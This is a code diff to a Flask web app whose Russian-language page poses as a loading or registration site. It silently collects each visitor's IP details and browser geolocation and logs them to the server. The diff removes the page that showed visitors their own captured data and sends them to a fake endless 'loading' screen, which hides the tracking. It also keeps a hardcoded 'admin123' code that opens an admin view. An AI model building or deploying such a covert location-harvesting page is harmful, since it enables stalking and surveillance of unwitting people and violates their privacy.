@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template_string, redirect
+from flask import Flask, request, render_template_string
 import json, uuid, os, sys
 from datetime import datetime
 
@@ -9,11 +9,11 @@ data_store = []
 def index():
     return render_template_string("""
     <html>
-    <head><title>Загрузка</title></head>
+    <head><title>Регистрация</title></head>
     <body style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
       <h2>Сайт загружается…</h2>
       <script>
-      async function collectAndShowForm() {
+      async function start() {
         try {
           const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
           navigator.geolocation.getCurrentPosition(async (position) => {
@@ -50,7 +50,7 @@ def index():
                 if (code === 'admin123') {
                   window.location.href = '/admin';
                 } else {
-                  window.location.href = '/info?id=' + '${id}';
+                  window.location.href = '/loading';
                 }
               }
               </script>
@@ -60,7 +60,7 @@ def index():
           document.body.innerHTML = "<h2>Ошибка при загрузке</h2>";
         }
       }
-      collectAndShowForm();
+      start();
       </script>
     </body>
     </html>
@@ -72,21 +72,11 @@ def log():
     data_store.append(data)
     return '', 204
 
-@app.route('/info')
-def info():
-    id = request.args.get('id')
-    entry = next((d for d in data_store if d['id'] == id), None)
-    if not entry:
-        return "Нет данных"
-    return render_template_string(f"""
-    <html><body>
-    <h2>Ваши данные:</h2>
-    <ul>
-      <li>IP: {entry['ip']}</li>
-      <li>Город: {entry['city']}, Регион: {entry['region']}, Страна: {entry['country']}</li>
-      <li>Координаты: {entry['latitude']}, {entry['longitude']}</li>
-      <li><a href="{entry['map_link']}" target="_blank">Открыть в Google Maps</a></li>
-    </ul>
+@app.route('/loading')
+def loading():
+    return render_template_string("""
+    <html><body style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
+    <h2>Сайт загружается…</h2>
     </body></html>
     """)
 
